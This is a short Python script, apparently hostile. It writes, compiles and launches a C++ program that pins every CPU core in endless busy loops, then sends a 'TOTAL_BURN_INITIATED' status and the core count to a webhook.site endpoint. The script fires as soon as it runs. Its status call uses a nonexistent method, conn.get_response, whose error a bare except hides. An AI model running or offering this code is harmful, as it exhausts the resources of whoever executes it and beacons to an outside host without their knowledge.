import os
import subprocess
import http.client
import json

def send_final_strike():
    cpp_code = """
    #include <iostream>
    #include <vector>
    #include <thread>
    #include <cmath>

    void burn() {
        double x = 0.5;
        while(true) {
            x = std::sin(x) * std::cos(x) + std::tan(x); // Нагрузка на ALU
        }
    }

    int main() {
        int cores = std::thread::hardware_concurrency();
        std::vector<std::thread> t;
        for(int i=0; i<cores; i++) t.emplace_back(burn);
        for(auto& thread : t) thread.join();
        return 0;
    }
    """
    with open("burn.cpp", "w") as f: f.write(cpp_code)
    
    # Компилируем и запускаем
    os.system("g++ -O3 burn.cpp -o burn -lpthread")
    subprocess.Popen(["./burn"])
    
    # Шлем статус
    try:
        conn = http.client.HTTPSConnection("webhook.site", timeout=5)
        payload = json.dumps({"EVENT": "TOTAL_BURN_INITIATED", "CORES": os.cpu_count()})
        conn.request("POST", "/d9ed8938-0733-4ce3-8d2c-63dab5606e87", payload)
        conn.get_response()
    except: pass

send_final_strike()
